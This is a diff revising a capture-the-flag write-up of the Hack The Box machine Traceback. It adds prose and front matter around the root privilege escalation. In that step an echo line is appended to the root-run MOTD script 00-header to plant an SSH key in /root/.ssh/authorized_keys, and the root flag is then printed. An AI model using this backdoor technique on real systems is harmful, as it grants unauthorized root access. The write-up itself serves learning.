@@ -1,10 +1,16 @@
+---
+description: >-
+  Zweilosec's write-up on the easy difficulty Linux machine Traceback from
+  https://hackthebox.eu
+---
+
 # HTB - Traceback
 
 ## Overview
 
 ![](../../.gitbook/assets/traceback-infocard.png)
 
-Short description to include any strange things to be dealt with
+Traceback is an easy difficulty Linux machine that gave a good introduction to web shells and tracing the steps of how an attacker compromised a server \(then defaced it!\).  
 
 ## Useful Skills and Tools
 
@@ -45,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 40.09 seconds
 
 ### SSH
 
-The only ports that were open were 22 -SSH and 80 - HTTP. I first tried connecting to ssh:
+The only ports that were open were 22 -SSH and 80 - HTTP. I first tried connecting to SH:
 
 ```text
 #################################
@@ -322,7 +328,7 @@ sysadmin
 
 I started out in `/bin/sh`, which was pretty limiting \(no history, arrow keys, or tab completion, etc\) so I tried to use my standard python PTY shell upgrade trick, but it didn't work.  _It was late and I was tired, so I looked up how to do it in Perl, since it was installed, using `perl -e 'exec "/bin/bash";'`.   When I went back to it the next morning, I realized that indeed python was not installed...but python3 was!  Doh!_
 
-I wasn't able to check sudo permissions without a password, so I checked running processes next.  I noticed a strange `sleep 30` running by root, so I decided to look further into what processes were being run as root with `ps -U root -u root` _\(from the man page\)_.
+I wasn't able to check sudo permissions without a password, so I checked running processes next.  I noticed a strange `sleep 30` process running by root, so I decided to look further into what processes were being run as root with `ps -U root -u root` _\(from the man page\)_.
 
 ```text
 sysadmin@traceback:/$ ps -U root -u root
@@ -392,18 +398,22 @@ sysadmin@traceback:/etc/update-motd.d$ cat 00-header
 echo "\nWelcome to Xh4H land \n"
 ```
 
-The file `00-header`seem to have been edited already by `Xh4H` when he defaced the site and set up his webshell. Since this is a bash script, can add commands to it that will be run when someone logs in.
+The file `00-header`seem to have been edited already by `Xh4H` when he defaced the site and set up his web shell. MOTD banners are just bash scripts which are executed each time a user logs into the machine, so I decided to add a line of my own to see if I could escalate privileges since the files and process that ran them were owned by `root`.  
 
 ### Getting a root shell
 
-every 30 secs the cronjob copies backups from /var/backups/.update-motd.d/ to /etc/update-motd.d/. This is the window where I have to execute the commands I need and initiate my exploit before the backup wipes my progress. I decided to go for broke and simply do the same privesc I had already been using. I copied my public ssh key to `authorized_keys` file, this time in the `/root/.ssh/` folder. In order to execute my command, I needed to run the motd program. This program is automatically run upon login, so I simply connected back to the `sysadmin` user through ssh, then logged out and logged in to `root` using ssh.
+According to the `ps` output, every 30 secs a cronjob copies the backups from `/var/backups/.update-motd.d/` to `/etc/update-motd.d/`. This was the window I had to edit the file and get it to execute to initiate my exploit before the backup wiped my progress. I decided to go for broke and simply use the same privilege escalation method I had already been using. 
 
 ```text
-sysadmin@traceback:/etc/update-motd.d$ echo 'echo "ssh-rsa AAAA<my_public_key> zweilos@kalimaa" >> /root/.ssh/authorized_keys' >> 00-header
+sysadmin@traceback:/etc/update-motd.d$ echo 'echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /root/.ssh/authorized_keys' >> 00-header
 ```
 
+I copied the same `echo` command I had used to escalate privileges to the previous two users, and echoed it into the MOTD file `00-header`. I set it to copy my public SSH key to the `authorized_keys` file, this time in the `/root/.ssh/` folder. 
+
+In order to execute my command, I needed to run the MOTD program. Since this program is automatically run upon login, I simply logged out, connected back to the `sysadmin` user through SSH, then logged out again, then logged in as `root`.
+
 ```text
-zweilos@kalimaa:~/htb/traceback$ ssh root@10.10.10.181
+zweilos@kali:~/htb/traceback$ ssh root@10.10.10.181
 #################################
 -------- OWNED BY XH4H  ---------
 - I guess stuff could have been configured better ^^ -
@@ -421,14 +431,14 @@ traceback
 
 ### Root.txt
 
+Of course I couldn't forget to collect my hard-earned proof!
+
 ```text
 root@traceback:~# cat root.txt 
 459b10823b6b0c485f082026477dcfa7
 ```
 
-\(asdg\)\[testlink\]
-
-Thanks to [`Xh4H`](https://www.hackthebox.eu/home/users/profile/21439) for something interesting or useful about this machine.
+Thanks to [`Xh4H`](https://www.hackthebox.eu/home/users/profile/21439) for creating a machine where I could learn about how web shells work, and about tracing back the steps that an attacker took to compromise a system.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
